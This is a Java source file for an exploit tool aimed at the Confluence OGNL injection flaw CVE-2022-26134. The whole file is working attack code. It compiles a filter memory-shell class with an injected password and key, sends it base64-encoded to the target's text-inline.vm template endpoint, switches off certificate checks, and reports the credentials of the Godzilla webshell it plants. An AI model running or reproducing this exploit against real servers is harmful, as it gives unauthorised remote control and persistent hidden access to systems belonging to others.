package main;
import javassist.ClassPool;
import javassist.CtClass;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.UUID;

public class Main {
    public static void main(String[] args) throws Throwable{
        if (args.length < 2) {
            System.out.println("java -jar CVE-2022-26134.jar http://127.0.0.1:8090/ pass key");
            return;
        }

        String urlstr = args[0];
        String password = args[1];
        String key = args[2];
        URL url = new URL(urlstr);
        String baseUrl = url.getProtocol() + "://" + url.getHost() + ":" + url.getPort() + "/";
        String ExploitUrl=baseUrl+"template/aui/text-inline.vm";
        System.out.println("[*] Exploit url: " + ExploitUrl);

        MiTM.trustAllHttpsCertificates();
        CtClass ctClass = ClassPool.getDefault().get("main.ConfluenceFilterMemshell");
        ctClass.makeClassInitializer().insertBefore(String.format("password = \"%s\";\n" +
                "     key = \"%s\";\n",password,md5(key).substring(0, 16).toLowerCase()));
        ctClass.setName("com.opensymphony.xwork." + UUID.randomUUID().toString().replace("-", ""));
        String txt = new String(readInputStream(Main.class.getResourceAsStream("poc.txt")));
        String labeltxt = new String(readInputStream(Main.class.getResourceAsStream("label.txt")));
        txt = txt.replace("{payload}", Base64.getEncoder().encodeToString(ctClass.toBytecode()));
        txt = txt.replace("{className}",ctClass.getName());
        String initpayload=new String(readInputStream(Main.class.getResourceAsStream("initpayload.txt")));
        String Exploitcontent = "poc=" + URLEncoder.encode(txt)+"&label="+URLEncoder.encode(labeltxt);
        SendPostRequest(initpayload,ExploitUrl);
        SendPostRequest(Exploitcontent,ExploitUrl);
        System.out.println("[*] send payload");
        HttpURLConnection validateRequest = ValidateRequest(ExploitUrl);
        if ( "ok".equals(validateRequest.getHeaderField("X-Cmd-Result"))){
            System.out.println("[*] exploit success");
            System.out.println("[*] godzilla webshell password : " + password);
            System.out.println("[*] godzilla webshell key : " + key);
        }else {
            System.out.println("[*] exploit fail");
        }
    }
    public static void SendPostRequest(String content,String url) throws Exception{
        HttpURLConnection urlConnection = (HttpURLConnection) new URL(url).openConnection();
        urlConnection.setRequestMethod("POST");
        urlConnection.setInstanceFollowRedirects(false);
        urlConnection.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
        urlConnection.setRequestProperty("User-Agent","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36");
        urlConnection.setDoOutput(true);
        urlConnection.setDoInput(true);
        urlConnection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        byte[] postDataBytes = content.getBytes(StandardCharsets.UTF_8);
        urlConnection.setRequestProperty("Content-Length", String.valueOf(postDataBytes.length));
        try (DataOutputStream wr = new DataOutputStream(urlConnection.getOutputStream())) {
            wr.write(postDataBytes);
        }
        int responseCode = urlConnection.getResponseCode();
        System.out.println("Response Code: " + responseCode);
        urlConnection.disconnect();
    }
    public static HttpURLConnection ValidateRequest(String url) throws Exception {
        MiTM.trustAllHttpsCertificates();
        HttpURLConnection urlConnection = (HttpURLConnection) new URL(url).openConnection();
        urlConnection.setRequestMethod("GET");
        int responseCode = urlConnection.getResponseCode();
        System.out.println("Validate Response Code: " + responseCode);
        return urlConnection;
    }
    public static byte[] readInputStream(InputStream inputStream) {
        byte[] temp = new byte[4096];
        int readOneNum = 0;
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            while ((readOneNum = inputStream.read(temp)) != -1) {
                bos.write(temp, 0, readOneNum);
            }
            inputStream.close();
        }catch (Exception e){
        }
        return bos.toByteArray();
    }
    public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; }

}
